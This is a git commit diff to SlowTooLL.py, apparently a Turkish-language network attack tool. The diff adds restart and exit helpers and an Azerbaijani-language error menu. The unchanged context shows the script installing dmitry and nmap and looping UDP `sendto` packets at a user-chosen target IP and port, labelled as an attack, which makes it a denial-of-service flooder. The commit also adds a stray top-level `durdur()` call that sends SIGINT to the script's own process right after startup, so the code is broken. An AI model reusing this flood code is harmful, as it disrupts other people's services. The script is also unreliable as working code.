1407995877f9af70b64ac8eb986c2c409a035d9c
Red-BITH <136892734+Red-BITH@users.noreply.github.com>
2023-06-17 10:00:23 -0700

    SlowTooLL.py

--- SlowTooLL.py
+++ SlowTooLL.py
@@ -2,11 +2,15 @@
 import os
 import socket
 import random
+import subprocess
 os.system("apt install dmitry")
 os.system("apt install nmap")
 os.system("clear")
 
 
+
+def yeniden_baslat():
+    subprocess.call(["bash", "-c", "exec $0"])
 
 # Renkli çıktılar için ANSI kaçış dizilerini tanımlayalım
 class Colors:
@@ -20,6 +24,12 @@ class Colors:
 # Renkli bir şekilde çıktı vermek için kullanabileceğiniz bir fonksiyon
 def print_colored(text, color):
     print(color + text + Colors.ENDC)
+
+def durdur():
+    subprocess.call(["kill", "-INT", str(os.getpid())])
+
+# Kullanım örneği
+durdur()
 
 # Örnek kullanım
 
@@ -74,4 +84,20 @@ elif(secim == '3'):
         sock.sendto(bytes , (hedef_ip,hedef_port))
         sayac=sayac+1
         print_colored("HUCUM EDILIR , gonderilen byte:%s"%(sayac) , Colors.GREEN)
+
+else:
+    print_colored("----Xəta baş verdi!", Colors.RED)
+    print_colored("""----Yenidən başlatma üçün : 1.
+                     ----Çıxış etmək üçün :2.""", Colors.YELLOW)
+    secim2 = input("Qərar ver:")
+    if(secim2 == '1'):
+        yeniden_baslat()
+    elif(secim2 == '2'):
+        durdur()
+    else:
+        durdur()
+        
+
+    
+    
         
